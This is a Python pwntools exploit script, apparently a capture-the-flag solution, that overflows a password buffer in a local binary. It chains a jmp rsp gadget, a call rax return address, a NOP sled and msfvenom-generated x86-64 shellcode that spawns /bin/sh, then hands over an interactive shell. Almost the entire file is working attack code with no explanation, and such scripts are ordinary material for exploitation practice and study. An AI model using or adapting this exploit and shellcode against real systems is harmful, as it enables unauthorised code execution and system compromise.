#!/usr/bin/env python2.7

from pwn import *
from sys import argv, exit


BIN_FILE = "./prog.bin"
CTX_OS = "linux"
CTX_TERM = "terminator"

GDB_SCRIPT = """
set pagination off
c
"""

## ----------------------------------------------------------------------------

def send_login(p, name) :
  p.recvuntil("login")
  p.sendline(name)

def send_pass(p, password) :
  p.recvuntil("pass")
  p.sendline(password)

def pwn(p) :
  from binascii import hexlify
  from struct import pack

  password = "`z@T/9AA"

  jmp_rsp = (6 * "\x90")                            ## nop
  jmp_rsp = jmp_rsp + "\xff\xe4"                    ## jmp rsp
  jmp_rsp = pack("L", int(hexlify(jmp_rsp), 16))

  ret = pack("L", 0x400538)                         ## 0x400538: call rax; add rsp,0x8; ret

  ## msfvenom -p linux/x64/exec -f py CMD=/bin/sh --bad-chars '\x00'
  shellcode =  ""
  shellcode += "\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
  shellcode += "\xef\xff\xff\xff\x48\xbb\x44\xbb\x01\x01\xc4\xf3\xbf"
  shellcode += "\x10\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
  shellcode += "\x2e\x80\x59\x98\x8c\x48\x90\x72\x2d\xd5\x2e\x72\xac"
  shellcode += "\xf3\xec\x58\xcd\x5c\x69\x2c\xa7\xf3\xbf\x58\xcd\x5d"
  shellcode += "\x53\xe9\xcc\xf3\xbf\x10\x6b\xd9\x68\x6f\xeb\x80\xd7"
  shellcode += "\x10\x12\xec\x49\x88\x22\xfc\xba\x10"

  buf = password + ("A" * (48 - len(password)))
  buf = buf + jmp_rsp                               ## jmp rsp
  buf = buf + ret                                   ## call rax
  buf = buf + "\xeb\x10"                            ## jmp 0x10
  buf = buf + (0x10 * "\x90")                       ## rewrite '\0'
  buf = buf + shellcode                             ## exec /bin/sh
  # buf = buf + ((512 - len(buf)) * "\x90")
  
  send_login(p, "admin")
  send_pass(p, buf)

## ----------------------------------------------------------------------------

def entry_point() :
  context.terminal = CTX_TERM

  binary = BIN_FILE

  elf = ELF(binary)                                 ## setting pwntools context os/arch
  context.os = CTX_OS                               ## so that we won't have to specify it explicitly
  context.arch = elf.arch                           ## when using pwntools functions like asm etc.

  p = process(binary)

  if (len(argv) > 1) and (len(argv) < 3) :
    ## Command line arguments handling
    if(argv[1] == "--gdb") :
      gdb.attach(p, GDB_SCRIPT)
    elif(argv[1] == "--pause") :
      pause()

  pwn(p)
  p.interactive()

if(__name__ == "__main__") :
  entry_point()
  exit(0)
